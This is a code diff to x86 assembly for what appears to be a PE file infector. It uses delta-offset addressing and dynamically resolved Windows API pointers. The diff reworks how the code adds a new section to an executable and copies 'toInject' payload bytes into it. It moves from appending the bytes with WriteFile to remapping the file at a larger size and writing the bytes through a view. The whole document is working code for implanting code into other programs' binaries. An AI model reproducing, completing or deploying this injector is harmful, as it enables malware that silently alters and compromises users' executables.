@@ -61,6 +61,7 @@ FileAlignment		dd	?
 NewSectionCodeSize	dd	?
 VirtualAddress		dd	?
 SizeOfRawData		dd	?
+PointerToRawData	dd	?
 
 ; Debug
 ErrorMessage	db	"Error_Injecting",0
@@ -285,12 +286,6 @@ inc	eax
 mov	ecx, [DELTA PeSectionNb]
 mov	word ptr [ecx], ax
 
-; SET PROPERTIES
-; SizeOfRawData aligned on FileAlignement (512)
-; PointerToRawData = prev.PointerToRawData + prev.SizeOfRawData
-; VirtualSize = actual size of the section
-; VirtualAdress = prev.VirtualAdress + prev.VirtualSize aligned on SectionAlignment (4096 (0xFFF)) (je crois?)
-
 ; COPY THE NAME
 mov	ecx, 08h ; Length of Name
 mov	esi, offset NewSectionName ; Source bytes
@@ -346,6 +341,7 @@ mov	eax, [ecx]
 add	ecx, 04h
 add	eax, [ecx]
 mov	[edi], eax
+mov	[DELTA PointerToRawData], eax
 
 ; Characteristics
 add	edi, 010h
@@ -382,37 +378,52 @@ PVDELTA	PeFileMap
 call	[DELTA pUnmapViewOfFile]
 PVDELTA	PeMapObject
 call	[DELTA pCloseHandle]
-PVDELTA	PeFile
-call	[DELTA pCloseHandle]
 
 
 ; CREATE NEW SECTION 
-; OPEN FILE
+; CREATE_FILE_MAPPING WITH SIZE + INJECT SIZE
+push	NULL
+mov	eax, [DELTA PointerToRawData]
+add	eax, [DELTA SizeOfRawData]
+push	eax ; New size
 push	0
-push	FILE_ATTRIBUTE_NORMAL	
-push	OPEN_ALWAYS
-push	0
-push	FILE_SHARE_READ
-push	FILE_APPEND_DATA
-PDELTA	offset FileName
-call	[DELTA pCreateFile]
-mov	[DELTA PeFile], eax
-call	CheckError
-
-; INSERT OPCODE
-mov	ecx, [DELTA SizeOfRawData] ; Number of bytes
-mov	esi, toInject
-add	esi, ebp ; Source bytes
-push	0
-push	0
-push	ecx
-push	esi
+push	PAGE_READWRITE
+push	NULL
 PVDELTA	PeFile
-call	[DELTA pWriteFile]
+call	[DELTA pCreateFileMapping]
 cmp	eax, 0
 je	JumpCheckError
+mov	[DELTA PeMapObject], eax
+
+; MAP_VIEW_OF_FILE
+push	0
+push	0
+push	0
+mov	eax, FILE_MAP_READ
+or	eax, FILE_MAP_WRITE
+push	eax
+PVDELTA	PeMapObject
+call	[DELTA pMapViewOfFile]
+cmp	eax, 0
+je	JumpCheckError
+mov	[DELTA PeFileMap], eax
+
+; INSERTING NEW SECTION - OPCODE COPY
+mov	ecx, [DELTA NewSectionCodeSize]
+mov	edi, [DELTA PeFileMap] ; Destination bytes
+add	edi, [DELTA PointerToRawData]
+mov	esi, toInject ; Source bytes
+add	esi, ebp
+createNewSection:
+lodsb
+stosb
+loop	createNewSection
 
 ; CLOSE
+PVDELTA	PeFileMap
+call	[DELTA pUnmapViewOfFile]
+PVDELTA	PeMapObject
+call	[DELTA pCloseHandle]
 PVDELTA	PeFile
 call	[DELTA pCloseHandle]
 
